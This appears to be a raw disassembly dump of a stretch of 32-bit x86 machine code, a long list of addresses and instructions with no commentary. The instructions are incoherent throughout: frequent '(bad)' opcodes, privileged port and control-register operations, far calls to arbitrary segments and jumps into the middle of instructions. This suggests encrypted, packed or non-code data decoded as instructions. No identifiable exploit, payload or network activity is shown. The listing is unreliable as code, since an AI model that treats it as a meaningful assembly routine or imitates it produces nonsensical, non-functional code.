  4113cb:	sub    DWORD PTR [ebx+ecx*1+0x1315bd7e],0x7aa00280
  4113d6:	in     al,dx
  4113d7:	fdiv   DWORD PTR [ecx+0x5f3e7ce7]
  4113dd:	ja     0x41145e
  4113df:	jg     0x4113e0
  4113e1:	mov    bh,0x5d
  4113e3:	cs push edi
  4113e5:	syscall 
  4113e7:	xlat   BYTE PTR ds:[ebx]
  4113e8:	xchg   BYTE PTR [esi-0x4912a732],al
  4113ee:	pop    esi
  4113ef:	scas   eax,DWORD PTR es:[edi]
  4113f0:	xlat   BYTE PTR ds:[ebx]
  4113f1:	push   0xffffffae
  4113f3:	mov    ds:0xeb32803f,eax
  4113f8:	jb     0x4113b3
  4113fa:	sbb    al,0xb1
  4113fc:	js     0x4113fc
  4113fe:	repnz in eax,0xcb
  411401:	pop    ss
  411402:	xor    al,0x4d
  411404:	mov    ebx,0xf3333330
  411409:	out    dx,al
  41140a:	ret    0x42c2
  41140d:	adc    al,0x80
  41140f:	mov    edi,0x9db695e
  411414:	adc    esi,edx
  411416:	stc    
  411417:	cld    
  411418:	lds    edi,FWORD PTR [esi+edi*1+0x7f]
  41141c:	jle    0x411494
  41141e:	jbe    0x4113f6
  411420:	adc    ecx,DWORD PTR [eax]
  411422:	add    al,0xd6
  411424:	ja     0x41149d
  411426:	ja     0x411417
  411428:	or     al,BYTE PTR [esi]
  41142a:	cmp    DWORD PTR [ebp+0x3e],0xffffff9f
  41142e:	scas   eax,DWORD PTR es:[edi]
  41142f:	iret   
  411430:	in     eax,0x72
  411432:	lods   eax,DWORD PTR ds:[esi]
  411433:	fwait
  411434:	fwait
  411435:	fwait
  411436:	jmp    0x41140e
  411438:	xor    al,0x4d
  41143a:	mov    edi,eax
  41143c:	jecxz  0x411411
  41143e:	mov    cl,0x58
  411440:	in     al,dx
  411441:	(bad)  
  411443:	jae    0x4114b8
  411445:	xchg   DWORD PTR [ebx-0x2ee01b37],edx
  41144b:	adc    BYTE PTR [esi-0x66],al
  41144e:	hlt    
  41144f:	lea    esi,[edi-0x32]
  411452:	loope  0x411496
  411454:	das    
  411455:	dec    ebx
  411456:	shl    DWORD PTR [ebp+0x7cc9ea0b],cl
  41145c:	jnp    0x411407
  41145e:	mov    edi,0xaf6bc325
  411463:	mov    ebp,0x55f006e6
  411468:	jmp    0x41146f
  41146a:	mov    bh,0xf0
  41146c:	in     eax,dx
  41146d:	gs sti 
  41146f:	gs push ecx
  411471:	jg     0x41144c
  411473:	mov    dh,0xcc
  411475:	out    0x27,eax
  411477:	or     ecx,DWORD PTR [edx-0x19127472]
  41147d:	jbe    0x41146c
  41147f:	call   0x9fdb78a6
  411484:	or     esp,DWORD PTR [edi*8-0x57670301]
  41148b:	imul   ecx,DWORD PTR [ecx],0xbe014c7c
  411491:	into   
  411492:	dec    ebp
  411493:	js     0x4114ff
  411495:	push   ecx
  411496:	mov    al,ds:0x596a2de4
  41149b:	loop   0x411421
  41149d:	shr    edi,0xc5
  4114a0:	daa    
  4114a1:	je     0x411488
  4114a3:	and    al,0xc0
  4114a5:	sti    
  4114a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114a7:	mov    BYTE PTR [ecx],dh
  4114a9:	or     bh,BYTE PTR [esi+0x6f]
  4114ac:	icebp  
  4114ad:	fldcw  WORD PTR [ecx+0x56eddb8c]
  4114b3:	ja     0x4114a3
  4114b5:	fdivr  QWORD PTR [ecx+0x1389c4eb]
  4114bb:	pop    ds
  4114bc:	inc    edx
  4114bd:	scas   al,BYTE PTR es:[edi]
  4114be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114bf:	stc    
  4114c0:	mov    bh,0x40
  4114c2:	jmp    0x4114a0
  4114c4:	and    dh,BYTE PTR [eax]
  4114c6:	mov    cl,0xd4
  4114c8:	or     eax,0x7ae9d710
  4114cd:	mov    dl,0x72
  4114cf:	mov    dl,0xfd
  4114d1:	cld    
  4114d2:	sbb    cl,BYTE PTR [edx+0x4ac26964]
  4114d8:	or     DWORD PTR [eax+0x66c9400a],esp
  4114de:	mov    bl,0xb9
  4114e0:	push   edi
  4114e1:	pop    edi
  4114e2:	jge    0x4114d9
  4114e4:	jnp    0x411469
  4114e6:	add    DWORD PTR [ebx+0x2be57e2f],0x5f
  4114ed:	jns    0x41149d
  4114ef:	mov    ds:0xa45be3a3,eax
  4114f4:	loope  0x411549
  4114f6:	test   eax,0x16161614
  4114fb:	xchg   esi,eax
  4114fc:	jl     0x41149e
  4114fe:	xchg   BYTE PTR [ecx+0x20],ah
  411501:	xchg   ebx,eax
  411502:	leave  
  411503:	pusha  
  411504:	jle    0x411584
  411506:	push   ds
  411507:	outs   dx,BYTE PTR ds:[esi]
  411508:	mov    bh,0xbb
  41150a:	stos   BYTE PTR es:[edi],al
  41150b:	imul   ebx,edx,0xc3c3c3db
  411511:	mov    edi,0x513264ce
  411516:	shl    DWORD PTR [esi*2+0x1bbe34d4],cl
  41151d:	xor    eax,0x655e5c21
  411522:	stos   BYTE PTR es:[edi],al
  411523:	aad    0x52
  411525:	ds lahf 
  411527:	(bad)  
  411528:	cmp    BYTE PTR [edi-0x1ffd6031],bl
  41152e:	push   esi
  41152f:	adc    al,0xc5
  411531:	jmp    0x4115a5
  411533:	mov    ecx,0x3d3d3dfc
  411538:	sbb    edi,DWORD PTR [ebp-0x32890a2]
  41153e:	cld    
  41153f:	cld    
  411540:	dec    ecx
  411541:	pop    ebp
  411542:	xlat   BYTE PTR ds:[ebx]
  411543:	out    0xd0,eax
  411545:	pusha  
  411546:	inc    edx
  411547:	out    dx,al
  411548:	iret   
  411549:	xchg   ebx,eax
  41154a:	(bad)  
  41154b:	out    0x2,eax
  41154d:	iret   
  41154e:	add    edi,DWORD PTR [ebx+0x62]
  411551:	es push esi
  411553:	cmp    esp,DWORD PTR [ecx+0x72d3df17]
  411559:	lahf   
  41155a:	popa   
  41155b:	popf   
  41155c:	mov    ds:0x472cb728,al
  411561:	rcl    BYTE PTR [esi+0x1a],1
  411564:	movups xmm1,xmm7
  411567:	in     eax,0x64
  411569:	inc    ecx
  41156a:	ins    DWORD PTR es:[edi],dx
  41156b:	ffreep st(0)
  41156d:	push   edx
  41156e:	xchg   ebx,eax
  41156f:	lahf   
  411570:	xchg   ebx,eax
  411571:	sub    DWORD PTR [esi+eax*1],0x28ae0a20
  411578:	lock and al,0x74
  41157b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41157c:	lods   eax,DWORD PTR ds:[esi]
  41157d:	dec    ecx
  41157e:	mov    al,ds:0x654045b8
  411583:	lds    edi,FWORD PTR [edx+0x7aa13272]
  411589:	add    dh,BYTE PTR [eax-0x660e8134]
  41158f:	sub    BYTE PTR [ebx-0x6c],al
  411592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411593:	adc    esi,DWORD PTR [ebx-0x7f]
  411596:	pop    ss
  411597:	lods   eax,DWORD PTR ds:[esi]
  411598:	adc    ebx,DWORD PTR [esi]
  41159a:	xor    al,0x14
  41159c:	mov    ebx,0x29cf8b2c
  4115a1:	mov    dh,0x18
  4115a3:	lock jne 0x4115a6
  4115a6:	sub    BYTE PTR [edi+0x7dbed8cb],dl
  4115ac:	sti    
  4115ad:	ss mov bh,0xdb
  4115b0:	fst    QWORD PTR [ecx-0x57]
  4115b3:	push   esp
  4115b4:	in     al,dx
  4115b5:	dec    esp
  4115b6:	jno    0x411606
  4115b8:	add    BYTE PTR [esi+0x6e],dh
  4115bb:	mov    ds:0x84cbfa68,al
  4115c0:	pop    ebx
  4115c1:	(bad)  
  4115c2:	cmp    DWORD PTR [eax-0x4c],ecx
  4115c5:	xor    BYTE PTR [eax-0x4d],ah
  4115c8:	sub    edx,DWORD PTR cs:[ebx+0x7b]
  4115cc:	mov    edi,0xc0658ee2
  4115d1:	jp     0x41157b
  4115d3:	test   eax,0x5f91a9a9
  4115d8:	(bad)  
  4115d9:	cli    
  4115da:	xlat   BYTE PTR ds:[ebx]
  4115db:	(bad)  
  4115dc:	in     al,dx
  4115dd:	fnstenv [ebx+0x6db69fe7]
  4115e3:	fcomi  st,st(6)
  4115e5:	mov    eax,0xde7e1861
  4115ea:	arpl   WORD PTR [edx+0x3e765e83],cx
  4115f0:	lahf   
  4115f1:	jg     0x411656
  4115f3:	data16 data16 out 0xd5,al
  4115f7:	pop    eax
  4115f8:	sub    al,0xf6
  4115fa:	xchg   ecx,eax
  4115fb:	imul   ebx,DWORD PTR [edx-0x191ce5f6],0x2ea0ae17
  411605:	sbb    al,0xa5
  411607:	push   0xffffffb5
  411609:	pop    edx
  41160a:	lods   al,BYTE PTR ds:[esi]
  41160b:	push   esp
  41160c:	sub    bl,BYTE PTR [ecx+0x28f9f9f9]
  411612:	push   0xffffff82
  411614:	dec    ebp
  411615:	iret   
  411616:	daa    
  411617:	push   cs
  411618:	ret    
  411619:	and    eax,0xfcdcf3ae
  41161e:	push   esi
  41161f:	es (bad) 
  411621:	mov    dl,0x82
  411623:	jp     0x411650
  411625:	sbb    ebx,0x186f5eed
  41162b:	xchg   BYTE PTR [edi+0x132ff99d],ah
  411631:	mul    ch
  411633:	les    ecx,FWORD PTR [edx]
  411635:	fs inc edx
  411637:	(bad)  
  411638:	retf   0xe032
  41163b:	sbb    DWORD PTR cs:[ebp+0x23efc00b],0x2e74fad3
  411646:	aaa    
  411647:	stos   DWORD PTR es:[edi],eax
  411648:	or     DWORD PTR [esp+ecx*1-0x517ca8bc],ebx
  41164f:	inc    edi
  411650:	jecxz  0x4116a1
  411652:	shl    BYTE PTR ds:0x7143ce29,cl
  411658:	and    al,0x3b
  41165a:	retf   
  41165b:	and    DWORD PTR [edx+0x102b14fd],0xf9f2005d
  411665:	test   eax,0x7603593c
  41166a:	popf   
  41166b:	sahf   
  41166c:	les    esp,FWORD PTR [edi-0x1d]
  41166f:	mul    DWORD PTR ds:0x83060842
  411675:	mov    ebp,0xcfdbb76e
  41167a:	mov    edx,0x4d4b0397
  41167f:	ins    DWORD PTR es:[edi],dx
  411680:	scas   al,BYTE PTR es:[edi]
  411681:	stc    
  411682:	ror    DWORD PTR [esi+0x2e26291],0x4e
  411689:	xlat   BYTE PTR ds:[ebx]
  41168a:	loopne 0x41164d
  41168c:	cmp    al,0x22
  41168e:	xchg   ecx,eax
  41168f:	gs pop ebx
  411691:	xchg   esi,eax
  411692:	adc    dl,BYTE PTR [eax+0x2b84d1d5]
  411698:	sbb    dl,BYTE PTR ds:0xa2ab0eb8
  41169e:	pop    es
  41169f:	nop    esp
  4116a2:	out    dx,eax
  4116a3:	icebp  
  4116a4:	js     0x4116a2
  4116a6:	mov    ch,0xc1
  4116a8:	rol    ecx,0xbf
  4116ab:	pop    ebx
  4116ac:	mov    edi,0xdcb7fd7e
  4116b1:	outs   dx,BYTE PTR ds:[esi]
  4116b2:	ja     0x4116f3
  4116b4:	outs   dx,DWORD PTR ds:[esi]
  4116b5:	sub    dl,BYTE PTR es:[edi+0x264c95cb]
  4116bc:	xor    esi,DWORD PTR [edx-0x2]
  4116bf:	cld    
  4116c0:	stc    
  4116c1:	pop    edi
  4116c2:	pushf  
  4116c3:	cmp    esi,DWORD PTR [edi-0x12]
  4116c6:	cmc    
  4116c7:	mov    edx,0x18d007e0
  4116cc:	sub    al,0xe3
  4116ce:	push   0xffffff82
  4116d0:	or     ebp,DWORD PTR [ebx-0x337125c8]
  4116d6:	scas   eax,DWORD PTR es:[edi]
  4116d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116d8:	aas    
  4116d9:	mov    esi,esi
  4116db:	add    ecx,DWORD PTR [ebx+0x9]
  4116de:	add    BYTE PTR [eax+0x4627f633],dl
  4116e4:	addr16 addr16 addr16 and al,0x93
  4116e9:	leave  
  4116ea:	pop    eax
  4116eb:	das    
  4116ec:	stos   DWORD PTR es:[edi],eax
  4116ed:	xchg   ebp,eax
  4116ee:	push   eax
  4116ef:	mov    bh,0x13
  4116f1:	cld    
  4116f2:	push   esi
  4116f3:	call   0x2d5e:0x98990b9f
  4116fa:	mov    bl,0x0
  4116fc:	mov    ebx,DWORD PTR fs:[eax+0x1f]
  411700:	push   ecx
  411701:	sub    BYTE PTR [eax-0x40],cl
  411704:	js     0x41175f
  411706:	xor    edx,edi
  411708:	or     bh,BYTE PTR cs:[edi]
  41170b:	aad    0x87
  41170d:	xor    DWORD PTR [edx+esi*1+0x1292731f],0x78
  411715:	test   al,0x35
  411717:	leave  
  411718:	mov    es,WORD PTR [eax-0x307fe0d8]
  41171e:	jno    0x411760
  411720:	mul    esi
  411722:	jne    0x411705
  411724:	add    DWORD PTR [edi],edi
  411726:	jp     0x411737
  411728:	mov    esp,0xd6e64265
  41172d:	enter  0xd4a0,0xe6
  411731:	or     al,0xa7
  411733:	icebp  
  411734:	pop    ds
  411735:	les    eax,FWORD PTR [eax-0x61]
  411738:	test   al,0x38
  41173a:	inc    esp
  41173b:	adc    ah,BYTE PTR [eax-0x3d1c234]
  411741:	jbe    0x41172e
  411743:	lods   eax,DWORD PTR ds:[esi]
  411744:	test   BYTE PTR [edi+0x39],bh
  411747:	fbld   TBYTE PTR [ebx-0x3a82c7d4]
  41174d:	add    al,0xc0
  41174f:	dec    ebp
  411750:	unpckhps xmm0,XMMWORD PTR [eax]
  411753:	into   
  411754:	popf   
  411755:	cmp    esi,DWORD PTR [edi-0x16]
  411758:	fdivr  QWORD PTR [ecx+0x7a7aa773]
  41175e:	jp     0x4116fe
  411760:	pop    edi
  411761:	mov    ch,0x6a
  411763:	aad    0xad
  411765:	mov    eax,ds:0x801d6850
  41176a:	fisubr WORD PTR [edx-0x4b]
  41176d:	pop    edx
  41176e:	pop    eax
  41176f:	pop    eax
  411770:	pop    eax
  411771:	clc    
  411772:	js     0x4117ea
  411774:	jbe    0x4117ec
  411776:	pop    eax
  411777:	xlat   BYTE PTR ds:[ebx]
  411778:	jne    0x411787
  41177a:	mov    ch,0xc4
  41177c:	mov    DWORD PTR [esi-0x7faa01c2],edx
  411782:	leave  
  411783:	jle    0x4117fe
  411785:	loopne 0x4117d5
  411787:	xchg   esi,eax
  411788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411789:	ja     0x411730
  41178b:	data16 (bad) 
  41178d:	push   ebp
  41178e:	sbb    ebx,0xa07936ed
  411794:	ins    BYTE PTR es:[edi],dx
  411795:	cmp    DWORD PTR [edx],eax
  411797:	fimul  WORD PTR [edx-0x65]
  41179a:	fistp  DWORD PTR [ebp-0x45ca37f9]
  4117a0:	int3   
  4117a1:	in     al,dx
  4117a2:	pop    ss
  4117a3:	xlat   BYTE PTR ds:[ebx]
  4117a4:	pop    ebx
  4117a5:	pop    ebp
  4117a6:	lahf   
  4117a7:	imul   ecx,DWORD PTR [ebp+0x59],0xffffff82
  4117ab:	lea    ebp,[eax+0x9]
  4117ae:	mov    ch,cl
  4117b0:	jne    0x41173c
  4117b2:	mov    ds:0xaa00212c,al
  4117b7:	daa    
  4117b8:	or     eax,0x3fa64631
  4117bd:	xor    eax,0x5000531f
  4117c2:	or     al,0x1a
  4117c4:	push   edx
  4117c5:	jge    0x4117af
  4117c7:	(bad)  
  4117c9:	cmp    al,BYTE PTR [ecx+esi*1+0x2]
  4117cd:	out    dx,al
  4117ce:	sbb    dh,al
  4117d0:	ins    BYTE PTR es:[edi],dx
  4117d1:	inc    esp
  4117d2:	and    al,BYTE PTR [ecx+ebx*2]
  4117d5:	nop
  4117d6:	nop
  4117d7:	pop    edi
  4117d8:	xchg   ebx,eax
  4117d9:	aas    
  4117da:	xor    edi,DWORD PTR [ebp+0x52a54a87]
  4117e0:	lods   al,BYTE PTR ds:[esi]
  4117e1:	outs   dx,DWORD PTR ds:[esi]
  4117e2:	push   ebx
  4117e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117e4:	fucomp st(6)
  4117e6:	pop    ebx
  4117e7:	and    ah,BYTE PTR [ecx]
  4117e9:	out    0xda,al
  4117eb:	pop    edi
  4117ec:	xor    al,0xed
  4117ee:	and    DWORD PTR [ecx+0x17],ebx
  4117f1:	ror    DWORD PTR [ecx-0x4485080],0x6e
  4117f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117f9:	fucomip st,st(7)
  4117fb:	daa    
  4117fc:	mov    cl,0x0
  4117fe:	clc    
  4117ff:	add    eax,0x5494ad89
  411804:	sub    dh,BYTE PTR ds:0x26a54a99
  41180a:	test   DWORD PTR [ebx+0x7e],esp
  41180d:	aam    0x32
  41180f:	mov    ds:0xfa99a8dc,eax
  411814:	lods   eax,DWORD PTR ds:[esi]
  411815:	and    bl,BYTE PTR [eax-0x3c1dfb61]
  41181b:	mov    al,dl
  41181d:	dec    ebp
  41181e:	call   0x5d34:0xab525e9e
  411825:	icebp  
  411826:	call   0x4ae3:0xe3e304d7
  41182d:	pop    edi
  41182e:	pop    edi
  41182f:	pop    edi
  411830:	xchg   ebx,eax
  411831:	push   esi
  411832:	add    ebp,esp
  411834:	fld    QWORD PTR [eax]
  411836:	cdq    
  411837:	xchg   esi,eax
  411838:	pop    ss
  411839:	retf   
  41183a:	mov    esp,DWORD PTR [ebp-0x47]
  41183d:	sbb    DWORD PTR [esi+0x676f4d1c],edi
  411843:	cli    
  411844:	fcmovnu st,st(5)
  411846:	sbb    ebx,DWORD PTR [eax+0x2a]
  411849:	and    al,0x76
  41184b:	les    esp,FWORD PTR [ecx]
  41184d:	and    edx,DWORD PTR [ecx]
  41184f:	jno    0x411889
  411851:	ja     0x41182d
  411853:	inc    edi
  411854:	ds cmp eax,0x4a95f099
  41185a:	add    eax,0xcadfbf7e
  41185f:	call   0xbb0e4d37
  411864:	xchg   esi,eax
  411865:	sub    al,0xf2
  411867:	dec    edi
  411868:	push   ss
  411869:	add    DWORD PTR [ecx+0x2250750c],edx
  41186f:	add    ah,BYTE PTR [eax]
  411871:	(bad)
  411876:	bound  ecx,QWORD PTR [ebx+eax*2+0x2e5daef6]
  41187d:	pop    ss
  41187e:	adc    cl,BYTE PTR [ecx+0x5cb94cc4]
  411884:	(bad)  
  411885:	shr    DWORD PTR [ebx+ecx*2],1
  411888:	mov    ds:0xea0b2fdf,al
  41188d:	push   ecx
  41188e:	cmp    DWORD PTR [ecx-0x1becd171],ebx
  411894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411895:	xlat   BYTE PTR ds:[ebx]
  411896:	sub    eax,0xf1f6cafc
  41189b:	imul   ecx,DWORD PTR [eax+0x4f85acd6],0x42
  4118a2:	add    BYTE PTR [edx-0x1932fef6],dh
  4118a8:	nop
  4118a9:	retf   0xc9d6
  4118ac:	fdiv   QWORD PTR [esi-0x52a3aff5]
  4118b2:	jp     0x41183c
  4118b4:	das    
  4118b5:	inc    ebp
  4118b6:	jl     0x4118b9
  4118b8:	mov    esp,0x975c542d
  4118bd:	pop    ebp
  4118be:	out    dx,eax
  4118bf:	call   0xad56:0x964c9922
  4118c6:	pop    edx
  4118c7:	aad    0x56
  4118c9:	dec    eax
  4118ca:	fs cmp esp,edi
  4118cd:	lods   eax,DWORD PTR ds:[esi]
  4118ce:	retf   0x72f3
  4118d1:	retf   
  4118d2:	adc    eax,0xdd8cb17e
  4118d7:	cmc    
  4118d8:	in     eax,dx
  4118d9:	add    al,0x8e
  4118db:	fldenv [edx+0x79]
  4118df:	xor    ecx,ecx
  4118e1:	inc    esi
  4118e2:	lods   al,BYTE PTR ds:[esi]
  4118e3:	mov    ds:0x834961a8,eax
  4118e8:	rol    DWORD PTR [esp+ebp*4],cl
  4118eb:	inc    eax
  4118ec:	ins    DWORD PTR es:[edi],dx
  4118ed:	rcl    BYTE PTR [edi],1
  4118ef:	dec    edx
  4118f0:	and    al,0xb
  4118f2:	add    al,0x2
  4118f4:	push   esi
  4118f5:	xchg   ebx,eax
  4118f6:	mov    dl,0x9d
  4118f8:	cdq    
  4118f9:	cs out dx,al
  4118fb:	mov    ds:0x548882d1,eax
  411900:	mov    eax,0x3fbe20d5
  411905:	mov    ebx,0x7b6bf2ba
  41190a:	mov    ebp,0x7f3f9c5e
  41190f:	jle    0x4118bf
  411911:	push   ds
  411912:	(bad)  
  411913:	out    dx,al
  411914:	mov    al,ds:0xdb59a3ea
  411919:	retf   
  41191a:	push   edx
  41191b:	jge    0x4118d6
  41191d:	dec    edi
  41191e:	iret   
  41191f:	shr    edx,1
  411921:	jnp    0x4118d6
  411923:	or     esp,DWORD PTR [edx+ecx*8]
  411926:	adc    al,0x97
  411928:	sbb    bh,al
  41192a:	xor    al,BYTE PTR [ebp+0xd5c2d73]
  411930:	add    ah,al
  411932:	mov    cr1,edx
  411935:	adc    ebx,ebp
  411937:	aam    0x2e
  411939:	adc    bh,BYTE PTR [ecx+0x35]
  41193c:	test   DWORD PTR [edi-0x34507829],ebx
  411942:	sbb    BYTE PTR [ecx+0x76],dl
  411945:	dec    esp
  411946:	jbe    0x411946
  411948:	xor    eax,0x1e5cb947
  41194d:	shl    DWORD PTR [ecx*2+0x1d02040b],cl
  411954:	mov    dl,0xc4
  411956:	cwde   
  411957:	jbe    0x41195b
  411959:	sub    DWORD PTR [ebx-0x46297e6],esi
  41195f:	test   DWORD PTR [ecx+edx*8],0xb1d7e7cc
  411966:	and    ecx,DWORD PTR [edx]
  411968:	push   cs
  411969:	xor    DWORD PTR [ebp-0x6a],edi
  41196c:	aaa    
  41196d:	lahf   
  41196e:	icebp  
  41196f:	std    
  411970:	pop    esp
  411971:	loopne 0x411938
  411973:	jmp    0x4118fe
  411975:	add    ah,BYTE PTR [edi]
  411977:	mov    edx,0xa8009c01
  41197c:	retf   
  41197d:	aaa    
  41197e:	pop    ebp
  41197f:	das    
  411980:	lahf   
  411981:	iret   
  411982:	add    eax,DWORD PTR [eax]
  411984:	cld    
  411985:	jle    0x4119c6
  411987:	inc    edx
  411988:	mov    eax,ds:0xb76edc10
  41198d:	xor    eax,0x3b9d804e
  411992:	shr    BYTE PTR [edi-0x75fdceb5],0x31
  411999:	mov    BYTE PTR [ebp-0x5e],dh
  41199c:	cli    
  41199d:	mov    BYTE PTR [ecx+0x46],cl
  4119a0:	jbe    0x4119c6
  4119a2:	mov    eax,0x4698b8b8
  4119a7:	lods   eax,DWORD PTR ds:[esi]
  4119a8:	add    eax,0x89dc678b
  4119ad:	out    0x3d,al
  4119af:	mul    edi
  4119b1:	scas   eax,DWORD PTR es:[edi]
  4119b2:	les    ecx,FWORD PTR [edi+0x654efbb7]
  4119b8:	fbstp  TBYTE PTR [ebx-0x36ec13d7]
  4119be:	mov    al,ds:0x2c2d709
  4119c3:	mov    al,ds:0x5c8d056d
  4119c8:	data16 sub BYTE PTR [eax],0xf0
  4119cc:	xlat   BYTE PTR ds:[ebx]
  4119cd:	call   0xe87f:0x3b6dc400
  4119d4:	push   ebx
  4119d5:	adc    eax,0x34d30e7a
  4119da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119db:	repnz stc 
  4119dd:	cld    
  4119de:	leave  
  4119df:	dec    eax
  4119e0:	and    al,0xf2
  4119e2:	adc    eax,0xfd11e33e
  4119e7:	mov    dh,0x13
  4119e9:	jb     0x411a5c
  4119eb:	pop    ebp
  4119ec:	aam    0xba
  4119ee:	lods   eax,DWORD PTR ds:[esi]
  4119ef:	mov    BYTE PTR [ebp+edx*8+0x26de0e7e],ah
  4119f6:	or     dl,BYTE PTR cs:0x248bfbf
  4119fd:	mov    dl,0x32
  4119ff:	push   esp
  411a00:	das    
  411a01:	push   ds
  411a02:	aaa    
  411a03:	add    BYTE PTR [edx-0x26],ch
  411a06:	cdq    
  411a07:	sti    
  411a08:	fadd   QWORD PTR [eax]
  411a0a:	lods   al,BYTE PTR ds:[esi]
  411a0b:	mov    dh,0x7e
  411a0d:	sbb    cl,BYTE PTR [ebp-0x66]
  411a10:	scas   al,BYTE PTR es:[edi]
  411a11:	dec    ebx
  411a12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a13:	jg     0x411a5c
  411a15:	inc    edi
  411a16:	pop    es
  411a17:	cmp    bh,BYTE PTR [edx]
  411a19:	cmp    ah,al
  411a1b:	idiv   ebx
  411a1d:	lods   eax,DWORD PTR ds:[esi]
  411a1e:	fisub  WORD PTR [edx+0x9c1eaad]
  411a24:	xor    BYTE PTR [edi],0x73
  411a27:	mov    bh,BYTE PTR [ecx]
  411a29:	add    ah,BYTE PTR [edx-0x2e]
  411a2c:	nop
  411a2d:	int3   
  411a2e:	pop    edx
  411a2f:	bnd jp 0x4119ef
  411a32:	dec    eax
  411a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a34:	rcl    DWORD PTR [ebp-0x6030180d],cl
  411a3a:	inc    edi
  411a3b:	int    0xbd
  411a3d:	in     eax,0xc2
  411a3f:	cs mov bl,0x74
  411a42:	fistp  WORD PTR gs:[eax-0xc4bc414]
  411a49:	jmp    0x2ebb673b
  411a4e:	in     al,0x7c
  411a50:	pop    ebp
  411a51:	ins    BYTE PTR es:[edi],dx
  411a52:	rcl    DWORD PTR [edx+0x7b120676],1
  411a58:	or     al,0x5d
  411a5a:	or     eax,0x31007ab4
  411a5f:	mov    edx,0x45835c6e
  411a64:	(bad)  
  411a65:	jp     0x411a09
  411a67:	jmp    0x5030f090
  411a6c:	xchg   bh,al
  411a6e:	pop    ds
  411a6f:	jg     0x411a4d
  411a71:	aam    0x34
  411a73:	in     eax,dx
  411a74:	in     eax,dx
  411a75:	dec    eax
  411a76:	and    al,0x62
  411a78:	jmp    0x411ad9
  411a7a:	mov    bh,0xf3
  411a7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a7d:	gs call 0x8edf:0xb76f979a
  411a85:	sbb    BYTE PTR [eax+ecx*4+0x44],al
  411a89:	and    BYTE PTR [esi-0x75946d45],bl
  411a8f:	out    0x71,eax
  411a91:	imul   eax,DWORD PTR [ebp-0x4aaaaa2a],0xffffff86
  411a98:	rcl    BYTE PTR [esi],cl
  411a9a:	iret   
  411a9b:	loope  0x411a33
  411a9d:	add    DWORD PTR ds:0x9fe7c21c,ecx
  411aa3:	pop    esp
  411aa4:	push   cs
  411aa5:	call   0x28a2af08
  411aaa:	pop    ebx
  411aab:	fs (bad) 
  411aad:	adc    ebx,ebp
  411aaf:	jae    0x411b1b
  411ab1:	push   0x6a
  411ab3:	xor    dl,BYTE PTR [esi]
  411ab5:	mov    ecx,ebp
  411ab7:	mov    ds:0x2b73f331,eax
  411abc:	cmps   DWORD PTR gs:[si],DWORD PTR es:[di]
  411abf:	(bad)
  411ac2:	iret   
  411ac3:	mov    dl,0x63
  411ac5:	nop
  411ac6:	sbb    al,0x13
  411ac8:	test   DWORD PTR [esp+edi*8+0x15],ebx
  411acc:	sbb    ebp,0x4d
  411acf:	mov    eax,0x2bc00416
  411ad4:	fldl2e 
  411ad6:	rcr    DWORD PTR [edx+0x3d],0xf8
  411ada:	daa    
  411adb:	pop    ecx
  411adc:	pop    edx
  411add:	inc    ebp
  411ade:	rep ins DWORD PTR es:[edi],dx
  411ae0:	and    DWORD PTR [ecx],0x7f
  411ae3:	dec    edx
  411ae4:	fs mov bl,0xd9
  411ae7:	mov    bl,0xb9
  411ae9:	pop    esp
  411aea:	push   cs
  411aeb:	cmp    eax,0xf3523d3d
  411af0:	cwde   
  411af1:	call   DWORD PTR [edx]
  411af3:	fisubr DWORD PTR [ecx-0x1]
  411af6:	push   esi
  411af7:	xchg   esi,eax
  411af8:	add    BYTE PTR [edi],ch
  411afa:	and    edx,DWORD PTR [ebx]
  411afc:	dec    edx
  411afd:	scas   al,BYTE PTR es:[edi]
  411afe:	sub    DWORD PTR [ebp+0x5a],esp
  411b01:	mov    ah,0x95
  411b03:	mov    esp,DWORD PTR [eax+0x47]
  411b06:	or     BYTE PTR [edx-0x3337ec86],dh
  411b0c:	xchg   esi,eax
  411b0d:	sub    eax,0x7069134
  411b12:	imul   esp,DWORD PTR [edi+0x1a],0x3329664
  411b19:	push   edi
  411b1a:	lods   eax,DWORD PTR ds:[esi]
  411b1b:	pop    edx
  411b1c:	lea    edi,gs:[ecx]
  411b1f:	shr    dh,1
  411b21:	sahf   
  411b22:	loop   0x411b62
  411b24:	adc    bh,BYTE PTR [eax+0x3e]
  411b27:	pushf  
  411b28:	cmp    BYTE PTR ds:0x7534ba62,ch
  411b2e:	imul   edi,edi,0xfe0f83e0
  411b34:	pusha  
  411b35:	call   0xb992:0x39720166
  411b3c:	cwde   
  411b3d:	mov    dl,0x6f
  411b3f:	push   edx
  411b40:	push   esi
  411b41:	mov    dh,0x9d
  411b43:	sbb    DWORD PTR [edi+0x4a],ebp
  411b46:	push   ss
  411b47:	push   ds
  411b48:	rcl    BYTE PTR [esi],1
  411b4a:	fwait
  411b4b:	mov    dh,0x6d
  411b4d:	pop    ebp
  411b4e:	(bad)  
  411b4f:	imul   eax,DWORD PTR [ebp+0x0],0x1c
  411b53:	xlat   BYTE PTR ds:[ebx]
  411b54:	inc    edx
  411b55:	enter  0x74af,0xf9
  411b59:	dec    esp
  411b5a:	mov    ds:0x3e1ead5a,al
  411b5f:	jnp    0x411b57
  411b61:	in     al,dx
  411b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b63:	mov    ds:0xedede828,al
  411b68:	mov    ch,0x3e
  411b6a:	pusha  
  411b6b:	pop    ecx
  411b6c:	sub    ch,BYTE PTR [esi-0x39c3a494]
  411b72:	test   DWORD PTR [esi+0x24],ebx
  411b75:	add    bl,BYTE PTR [ecx+0x59]
  411b78:	cmp    BYTE PTR [eax+0x2a6d5cbe],0x96
  411b7f:	mov    bl,0x23
  411b81:	or     al,0xbb
  411b83:	jp     0x411bf7
